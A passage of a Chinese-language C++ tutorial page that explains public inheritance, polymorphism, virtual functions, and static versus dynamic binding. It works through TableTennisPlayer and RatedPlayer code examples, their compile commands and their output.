<span class="title">Programmer</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">writeCode</span><span class="params">(Computer&amp; pc)</span> </span>&#123; <span class="comment">// Programmer uses-a Computer</span></span><br><span class="line">        <span class="comment">// ... 使用 pc 对象 ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><p><strong>为什么区分很重要？</strong></p><p>正确地识别类之间的关系并选择合适的实现方式（公有继承、私有继承、保护继承、组合、关联）对于设计良好、可维护的面向对象系统至关重要。</p><ul><li>  <strong>公有继承 (<code>public</code>)</strong> 应该只用于模拟<strong>真正</strong>的 “is-a” 关系。如果派生类不能完全替代基类（即不符合 Liskov 替换原则 - Liskov Substitution Principle），那么使用公有继承可能是不恰当的。</li><li>  如果关系是 “has-a”，应该使用<strong>组合</strong>（成员对象）。</li><li>  如果只是临时使用，则是 “uses-a” 关系。</li></ul><p><strong>不恰当的 “is-a” 示例:</strong></p><p>假设你想创建一个 <code>Square</code> 类和一个 <code>Rectangle</code> 类。你可能会想让 <code>Square</code> 继承自 <code>Rectangle</code>，因为正方形“是”矩形。但这里存在问题：如果 <code>Rectangle</code> 有 <code>setWidth()</code> 和 <code>setHeight()</code> 方法，并且它们可以独立设置宽高，那么当你在一个被视为 <code>Rectangle</code> 的 <code>Square</code> 对象上调用 <code>setWidth()</code> 时，为了保持正方形的性质，你可能需要同时修改高度，这违反了 <code>Rectangle</code> 的行为预期（宽度和高度可以独立设置）。在这种情况下，公有继承可能不是最佳选择，可能需要重新考虑设计或使用其他继承方式。</p><p><strong>总结:</strong></p><ul><li>  公有继承 (<code>public</code>) 建立了一种 <strong>“is-a”</strong> 关系，表示派生类是基类的一种特殊类型。</li><li>  “is-a” 关系的核心是派生类继承了基类的公有接口，因此可以像基类对象一样被使用。</li><li>  这体现在基类指针或引用可以指向或引用派生类对象。</li><li>  应将公有继承与 “has-a”（组合）和 “uses-a”（关联）关系区分开。</li><li>  只有在派生类确实符合基类的行为契约时，才应使用公有继承。</li></ul><h2 id="13-3-多态公有继承"><a href="#13-3-多态公有继承" class="headerlink" title="13.3 多态公有继承"></a>13.3 多态公有继承</h2><p>我们已经知道，公有继承建立了 “is-a” 关系，允许我们使用基类指针或引用来指向或引用派生类对象。例如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RatedPlayer <span class="title">rp</span><span class="params">(<span class="string">&quot;May&quot;</span>, <span class="string">&quot;Lee&quot;</span>, <span class="literal">true</span>, <span class="number">1500</span>)</span></span>;</span><br><span class="line">TableTennisPlayer * pt = &amp;rp; <span class="comment">// 基类指针指向派生类对象</span></span><br></pre></td></tr></table></figure><p>然而，当我们通过基类指针或引用调用一个<strong>同时存在于基类和派生类中</strong>的方法时，默认情况下会发生什么呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pt-&gt;Name(); <span class="comment">// 调用哪个 Name() 方法？ TableTennisPlayer::Name() 还是 RatedPlayer::Name()？</span></span><br></pre></td></tr></table></figure><p>在没有特殊处理的情况下，C++ 默认使用<strong>静态联编 (Static Binding)</strong> 或<strong>早绑定 (Early Binding)**。这意味着编译器在编译时根据指针或引用的</strong>静态类型**（声明的类型，这里是 <code>TableTennisPlayer*</code>）来决定调用哪个版本的方法。因此，即使 <code>pt</code> 实际指向一个 <code>RatedPlayer</code> 对象，<code>pt-&gt;Name()</code> 也会调用 <code>TableTennisPlayer::Name()</code>。</p><p>这通常不是我们期望的行为，尤其是在处理不同类型的派生类对象时。我们希望程序能够在<strong>运行时</strong>根据指针或引用<strong>实际指向的对象类型</strong>来选择调用相应的方法。这种“多种形态”的行为就是**多态 (Polymorphism)**。</p><p><strong>多态</strong>是面向对象编程的三大支柱之一（另外两个是封装和继承）。它允许我们以统一的方式（通过基类接口）处理不同类型的对象，而这些对象各自以自己的方式响应相同的消息（方法调用）。</p><p><strong>如何实现多态？</strong></p><p>C++ 通过使用<strong>虚函数 (Virtual Functions)</strong> 和<strong>动态联编 (Dynamic Binding)</strong> 或<strong>晚绑定 (Late Binding)</strong> 来实现多态。</p><p><strong>虚函数 (Virtual Functions):</strong></p><ul><li>  要在派生类中重新定义（覆盖）基类的方法，并且希望通过基类指针/引用调用时能够执行派生类的版本，就必须在<strong>基类</strong>中将该方法声明为<strong>虚函数</strong>。</li><li>  通过在基类方法声明前加上 <code>virtual</code> 关键字来实现。</li></ul><p><strong>修改 <code>TableTennisPlayer</code> (tabtenn1.h)</strong></p><p>让我们创建一个新版本的头文件 <code>tabtenn1.h</code>，在其中将 <code>Name()</code> 方法声明为虚函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TABTENN1_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABTENN1_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // 添加 iostream 以便在头文件中使用 cout (虽然通常不推荐)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基类 - 使用虚函数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableTennisPlayer</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> firstname;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> lastname;</span><br><span class="line">    <span class="keyword">bool</span> hasTable;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TableTennisPlayer (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                       <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                       <span class="keyword">bool</span> ht = <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 将 Name() 声明为虚函数</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Name</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">HasTable</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> hasTable; &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetTable</span><span class="params">(<span class="keyword">bool</span> v)</span> </span>&#123; hasTable = v; &#125;;</span><br><span class="line">    <span class="comment">// 添加一个虚析构函数通常是好习惯 (稍后解释)</span></span><br><span class="line">    <span class="keyword">virtual</span> ~TableTennisPlayer() &#123; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 派生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RatedPlayer</span> :</span> <span class="keyword">public</span> TableTennisPlayer &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> rating;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    RatedPlayer (<span class="keyword">unsigned</span> <span class="keyword">int</span> r = <span class="number">0</span>, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                 <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln = <span class="string">&quot;none&quot;</span>, <span class="keyword">bool</span> ht = <span class="literal">false</span>);</span><br><span class="line">    RatedPlayer(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> TableTennisPlayer &amp; tp);</span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">Rating</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> rating; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetRating</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> r)</span> </span>&#123; rating = r; &#125;</span><br><span class="line">    <span class="comment">// 覆盖基类的虚函数 Name()</span></span><br><span class="line">    <span class="comment">// C++11 推荐使用 override 关键字明确表示覆盖</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Name</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span></span>; <span class="comment">// 也可以只写 virtual void Name() const;</span></span><br><span class="line">                                        <span class="comment">// 或 void Name() const; (如果基类是 virtual，派生类同名同参方法自动也是 virtual)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// TABTENN1_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>修改实现 (tabtenn1.cpp)</strong></p><p>我们需要提供 <code>RatedPlayer::Name()</code> 的实现，并更新构造函数以匹配新的类名。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tabtenn1.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TableTennisPlayer 方法</span></span><br><span class="line">TableTennisPlayer::TableTennisPlayer (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn,</span><br><span class="line">                                      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln, <span class="keyword">bool</span> ht)</span><br><span class="line">                                      : firstname(fn), lastname(ln), hasTable(ht) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableTennisPlayer::Name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; lastname &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; firstname;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RatedPlayer 方法</span></span><br><span class="line">RatedPlayer::RatedPlayer(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn,</span><br><span class="line">                         <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln, <span class="keyword">bool</span> ht)</span><br><span class="line">                         : TableTennisPlayer(fn, ln, ht), rating(r) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RatedPlayer::RatedPlayer(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> TableTennisPlayer &amp; tp)</span><br><span class="line">                         : TableTennisPlayer(tp), rating(r) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RatedPlayer 覆盖的 Name() 方法实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RatedPlayer::Name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 可以调用基类的 Name() 方法</span></span><br><span class="line">    TableTennisPlayer::Name();</span><br><span class="line">    <span class="comment">// 添加自己的输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, Rating: &quot;</span> &lt;&lt; rating;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>动态联编 (Dynamic Binding):</strong></p><p>当通过<strong>基类指针或引用</strong>调用一个<strong>虚函数</strong>时，程序会根据指针或引用<strong>实际指向的对象类型</strong>来决定调用哪个版本的方法。这个决定是在<strong>运行时</strong>做出的，因此称为动态联编或晚绑定。</p><p><strong>使用示例 (usett1.cpp)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tabtenn1.h&quot;</span> <span class="comment">// 使用包含虚函数的新版本</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">( <span class="keyword">void</span> )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="function">TableTennisPlayer <span class="title">player1</span><span class="params">(<span class="string">&quot;Tara&quot;</span>, <span class="string">&quot;Boomdea&quot;</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">    <span class="function">RatedPlayer <span class="title">rplayer1</span><span class="params">(<span class="number">1140</span>, <span class="string">&quot;Mallory&quot;</span>, <span class="string">&quot;Duck&quot;</span>, <span class="literal">true</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过对象直接调用，总是调用对象所属类的方法 (静态联编)</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Direct call:\n&quot;</span>;</span><br><span class="line">    player1.Name(); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 调用 TableTennisPlayer::Name()</span></span><br><span class="line">    rplayer1.Name(); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 调用 RatedPlayer::Name()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过指针调用虚函数 (动态联编)</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nUsing pointers to base type:\n&quot;</span>;</span><br><span class="line">    TableTennisPlayer * pt1 = &amp;player1;</span><br><span class="line">    TableTennisPlayer * pt2 = &amp;rplayer1;</span><br><span class="line"></span><br><span class="line">    pt1-&gt;Name(); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// pt1 指向 TableTennisPlayer 对象，调用 TableTennisPlayer::Name()</span></span><br><span class="line">    pt2-&gt;Name(); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// *** pt2 指向 RatedPlayer 对象，调用 RatedPlayer::Name() ***</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过引用调用虚函数 (动态联编)</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nUsing references to base type:\n&quot;</span>;</span><br><span class="line">    TableTennisPlayer &amp; rt1 = player1;</span><br><span class="line">    TableTennisPlayer &amp; rt2 = rplayer1;</span><br><span class="line"></span><br><span class="line">    rt1.Name(); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// rt1 引用 TableTennisPlayer 对象，调用 TableTennisPlayer::Name()</span></span><br><span class="line">    rt2.Name(); <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// *** rt2 引用 RatedPlayer 对象，调用 RatedPlayer::Name() ***</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译和运行:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ usett1.cpp tabtenn1.cpp -o usett1</span><br><span class="line">./usett1</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Direct call:</span><br><span class="line">Boomdea, Tara</span><br><span class="line">Duck, Mallory, Rating: 1140</span><br><span class="line"></span><br><span class="line">Using pointers to base type:</span><br><span class="line">Boomdea, Tara</span><br><span class="line">Duck, Mallory, Rating: 1140</span><br><span class="line"></span><br><span class="line">Using references to base type:</span><br><span class="line">Boomdea, Tara</span><br><span class="line">Duck, Mallory, Rating: 1140</span><br></pre></td></tr></table></figure><p>可以看到，当通过基类指针 <code>pt2</code> 或基类引用 <code>rt2</code> 调用虚函数 <code>Name()</code> 时，程序在运行时检查到它们实际指向/引用的是 <code>RatedPlayer</code> 对象，因此调用了 <code>RatedPlayer::Name()</code> 版本，实现了多态行为。</p><p><strong>为什么需要多态？</strong></p><p>多态允许我们编写更通用、更灵活的代码。例如，我们可以创建一个函数，接受一个 <code>TableTennisPlayer</code> 的指针或引用数组，然后遍历这个数组，对每个元素调用 <code>Name()</code> 方法。即使数组中包含不同类型的球员（<code>TableTennisPlayer</code>, <code>RatedPlayer</code> 或其他派生类），只要 <code>Name()</code> 是虚函数，每个对象都会以自己正确的方式显示其名称和信息。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowPlayerInfo</span><span class="params">(<span class="keyword">const</span> TableTennisPlayer &amp; player)</span> </span>&#123;</span><br><span class="line">    player.Name(); <span class="comment">// 会根据 player 实际类型调用正确的 Name() 版本</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... in main ...</span></span><br><span class="line">ShowPlayerInfo(player1);</span><br><span class="line">ShowPlayerInfo(rplayer1);</span><br></pre></td></tr></table></figure><p><strong>总结:</strong></p><ul><li>  <strong>多态</strong>允许以统一的方式处理不同类型的对象。</li><li>  C++ 通过<strong>公有继承</strong>、<strong>虚函数 (<code>virtual</code>)</strong> 和<strong>动态联编</strong>来实现多态。</li><li>  在基类中将希望在派生类中重新定义并希望通过基类指针/引用调用的方法声明为 <code>virtual</code>。</li><li>  当通过基类指针或引用调用虚函数时，程序在<strong>运行时</strong>根据对象的实际类型确定要调用的方法版本（动态联编）。</li><li>  如果未使用 <code>virtual</code>，则根据指针/引用的<strong>声明类型</strong>在<strong>编译时</strong>确定调用版本（静态联编）。</li><li>  多态是实现代码灵活性和可扩展性的关键 OOP 技术。</li></ul><h2 id="13-4-静态联编和动态联编"><a href="#13-4-静态联编和动态联编" class="headerlink" title="13.4 静态联编和动态联编"></a>13.4 静态联编和动态联编</h2><p><strong>联编 (Binding)</strong> 指的是将源代码中的函数调用（或方法调用）与其在可执行代码中的具体实现（函数体）关联起来的过程。C++ 支持两种类型的联编：静态联编和动态联编。理解它们的区别对于掌握多态至关重要。</p><h3 id="13-4-1-指针和引用类型的兼容性"><a href="#13-4-1-指针和引用类型的兼容性" class="headerlink" title="13.4.1 指针和引用类型的兼容性"></a>13.4.1 指针和引用类型的兼容性</h3><p>我们已经知道，在公有继承下，基类指针或引用可以指向或引用派生类对象。这是实现多态的前提。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设 RatedPlayer 公有继承自 TableTennisPlayer</span></span><br><span class="line">RatedPlayer rp;</span><br><span class="line">TableTennisPlayer * pt = &amp;rp; <span class="comment">// OK</span></span><br><span class="line">TableTennisPlayer &amp; rt = rp; <span class="comment">// OK</span></span><br></pre></td></tr></table></figure><p>这种向上转换（将派生类指针/引用转换为基类指针/引用）是自动且安全的，因为派生类对象保证包含了基类的所有成员和接口。</p><p>反过来，将基类指针或引用转换为派生类指针或引用（向下转换）通常是不安全的，需要显式类型转换（如 <code>dynamic_cast</code>，将在后面章节讨论），并且只有在指针/引用确实指向一个派生类对象时才有效。</p><h3 id="13-4-2-虚成员函数和动态联编"><a href="#13-4-2-虚成员函数和动态联编" class="headerlink" title="13.4.2 虚成员函数和动态联编"></a>13.4.2 虚成员函数和动态联编</h3><p>现在考虑通过基类指针或引用调用成员函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pt-&gt;SomeMethod();</span><br><span class="line">rt.SomeMethod();</span><br></pre></td></tr></table></figure><p>编译器如何决定调用哪个 <code>SomeMethod</code> 的实现（基类的还是派生类的）？这取决于 <code>SomeMethod</code> 是否是<strong>虚函数</strong>以及联编方式。</p><p><strong>静态联编 (Static Binding / Early Binding):</strong></p><ul><li>  <strong>何时发生:</strong> 当调用的函数<strong>不是</strong>虚函数时，或者当通过<strong>对象本身</strong>（而不是指针或引用）调用函数时（无论是虚函数还是非虚函数）。</li><li>  <strong>决策依据:</strong> 编译器在<strong>编译时</strong>根据指针或引用的<strong>声明类型</strong>（静态类型）来决定调用哪个函数版本。</li><li>  <strong>行为:</strong> 即使基类指针 <code>pt</code> 指向一个派生类对象 <code>rp</code>，如果 <code>SomeMethod</code> 不是虚函数，<code>pt-&gt;SomeMethod()</code> 仍然会调用<strong>基类</strong>的 <code>SomeMethod</code> 版本。</li><li>  <strong>效率:</strong> 静态联编效率较高，因为在编译时就已经确定了要调用的函数地址。</li></ul><p><strong>动态联编 (Dynamic Binding / Late Binding):</strong></p><ul><li>  <strong>何时发生:</strong> 当通过<strong>基类指针或引用</strong>调用一个<strong>虚函数 (<code>virtual</code>)</strong> 时。</li><li>  <strong>决策依据:</strong> 程序在<strong>运行时</strong>检查指针或引用<strong>实际指向的对象类型</strong>，并调用该对象所属类的相应虚函数版本。</li><li>  <strong>行为:</strong> 如果基类指针 <code>pt</code> 指向一个派生类对象 <code>rp</code>，并且 <code>SomeMethod</code> 是虚函数，<code>pt-&gt;SomeMethod()</code> 会调用<strong>派生类</strong>的 <code>SomeMethod</code> 版本。这就是<strong>多态</strong>的核心。</li><li>  <strong>实现机制 (概念上):</strong> 编译器通常为包含虚函数的类创建一个**虚函数表 (virtual function table, vtable)**。vtable 是一个存储虚函数地址的数组。每个包含虚函数的类的对象内部都有一个隐藏的指针（通常称为 vptr），指向其类的 vtable。当通过基类指针调用虚函数时，程序通过对象的 vptr 找到 vtable，然后在 vtable 中查找并调用正确的函数地址。这个查找过程发生在运行时。</li><li>  <strong>效率:</strong> 动态联编比静态联编有轻微的运行时开销（需要查找 vtable），但在现代处理器上这种开销通常很小，而它带来的灵活性是巨大的。</li></ul><p><strong>总结对比:</strong></p><table><thead><tr><th align="left">特性</th><th align="left">静态联编 (Static Binding)</th><th align="left">动态联编 (Dynamic Binding)</th></tr></thead><tbody><tr><td align="left"><strong>发生时间</strong></td><td align="left">编译时</td><td align="left">运行时</td></tr><tr><td align="left"><strong>触发条件</strong></td><td align="left">调用非虚函数，或通过对象调用任何函数</td><td align="left">通过<strong>基类指针/引用</strong>调用<strong>虚函数</strong></td></tr><tr><td align="left"><strong>决策依据</strong></td><td align="left">指针/引用的<strong>声明类型</strong> (静态类型)</td><td align="left">指针/引用<strong>实际指向的对象类型</strong> (动态类型)</td></tr><tr><td align="left"><strong>行为</strong></td><td align="left">调用声明类型的函数版本</td><td align="left">调用实际对象类型的函数版本 (多态)</td></tr><tr><td align="left"><strong>机制</strong></td><td align="left">直接函数调用</td><td align="left">通常通过虚函数表 (vtable) 实现</td></tr><tr><td align="left"><strong>效率</strong></td><td align="left">较高</td><td align="left">略低于静态联编，但通常可接受</td></tr></tbody></table><h3 id="13-4-3-有关虚函数注意事项"><a href="#13-4-3-有关虚函数注意事项" class="headerlink" title="13.4.3 有关虚函数注意事项"></a>13.4.3 有关虚函数注意事项</h3><p>为了正确使用虚函数和动态联编，需要注意以下几点：</p><ol><li><p> <strong>在基类中声明 <code>virtual</code>:</strong> 必须在基类中将希望表现出多态行为的函数声明为 <code>virtual</code>。</p></li><li><p> <strong>派生类覆盖:</strong> 如果派生类提供了同名、同参数列表（包括 <code>const</code> 属性）的方法，它将自动覆盖（override）基类的虚函数。这个派生类方法也自动成为虚函数，无论是否显式使用了 <code>virtual</code> 关键字。</p></li><li><p><strong><code>override</code> 关键字 (C++11):</strong> 强烈建议在派生类覆盖虚函数时使用 <code>override</code> 关键字。这会让编译器检查该方法是否确实覆盖了基类中的某个虚函数。如果签名不匹配（例如，参数类型不同或 <code>const</code> 属性不同），编译器会报错，帮助捕获潜在错误。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// virtual void func(int) override; // 错误！const 属性不匹配</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span> <span class="keyword">const</span> <span class="keyword">override</span></span>; <span class="comment">// 正确！明确覆盖</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>final</code> 关键字 (C++11):</strong> 如果不希望某个虚函数在更深层次的派生类中被进一步覆盖，可以在其声明后加上 <code>final</code>。也可以将整个类声明为 <code>final</code>，阻止任何类从它派生。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 覆盖 func，并且不允许 Derived 的子类再覆盖它</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span 